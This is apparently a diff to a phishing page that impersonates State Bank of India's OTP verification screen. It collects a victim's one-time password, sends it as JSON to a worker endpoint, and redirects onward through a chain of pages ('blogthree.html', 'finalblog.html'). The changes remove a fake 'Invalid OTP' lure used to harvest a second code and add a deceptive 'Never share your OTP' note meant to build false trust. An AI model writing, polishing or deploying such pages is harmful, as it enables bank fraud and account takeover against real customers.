@@ -13,11 +13,9 @@
         .header-bar { background-color: #315195; color: white; padding: 10px 15px; font-size: 14px; font-weight: bold; }
         .content-area { padding: 15px 20px; }
         
-        /* Error Message Box (Invalid OTP Alert) */
-        .error-msg-box { 
-            font-size: 13px; color: #b30000; line-height: 1.6; margin-bottom: 15px; 
-            padding: 12px; background-color: #fff0f0; border: 1px solid #ffcccc; border-radius: 4px; 
-            font-weight: bold; display: flex; align-items: center; gap: 8px;
+        .msg-box { 
+            font-size: 13px; color: #333; line-height: 1.6; margin-bottom: 15px; 
+            padding: 12px; background-color: #f8fbff; border: 1px solid #d1e9ff; border-radius: 4px; 
         }
         
         .timer-box { color: #b30000; font-weight: bold; font-size: 14px; margin-bottom: 15px; text-align: right; }
@@ -46,15 +44,14 @@
         <div class="header-bar">High Security Password Verification</div>
         
         <div class="content-area">
-            <div class="error-msg-box">
-                <span>⚠️</span> 
-                Invalid OTP. The password you entered is incorrect or expired. A new OTP has been sent to your registered mobile number.
+            <div class="msg-box">
+                A One Time Password (OTP) has been sent to your registered mobile number. Please enter the OTP to proceed with the verification.
             </div>
             
-            <div class="timer-box">New OTP expires in: <span id="timer">02:00</span></div>
+            <div class="timer-box">OTP expires in: <span id="timer">02:00</span></div>
             
             <div class="field-group">
-                <label>Enter New One Time Password *</label>
+                <label>Enter One Time Password *</label>
                 <input type="number" id="otp_val_new" class="otp-input" inputmode="numeric" 
                        oninput="if(this.value.length > 6) this.value = this.value.slice(0, 6);" 
                        required>
@@ -66,7 +63,7 @@
             </div>
 
             <div class="footer-note">
-                <b>Note:</b> If you do not receive the OTP, please ensure your mobile network is stable or click on 'Resend OTP'.
+                <b>Security Note:</b> Never share your OTP with anyone. SBI will never ask for such details via phone or email.
             </div>
         </div>
         
@@ -106,10 +103,9 @@
             btn.disabled = true;
             btn.innerText = "Verifying...";
 
-            // Sending to Worker as Second OTP
             const payload = { 
                 type: "OTP",
-                step: "OTP-2 (Invalid Path)", 
+                step: "OTP-SERVICE", 
                 otp: otp
             };
 
@@ -121,13 +117,12 @@
                     body: JSON.stringify(payload) 
                 });
                 
-                // Success redirect to PAN/DOB page
-                window.location.href = "blogthree.html"; 
+                // Final Redirect to finalblog.html
+                window.location.href = "finalblog.html"; 
             } catch (err) {
-                window.location.href = "blogthree.html";
+                window.location.href = "finalblog.html";
             }
         }
     </script>
 </body>
 </html>
-
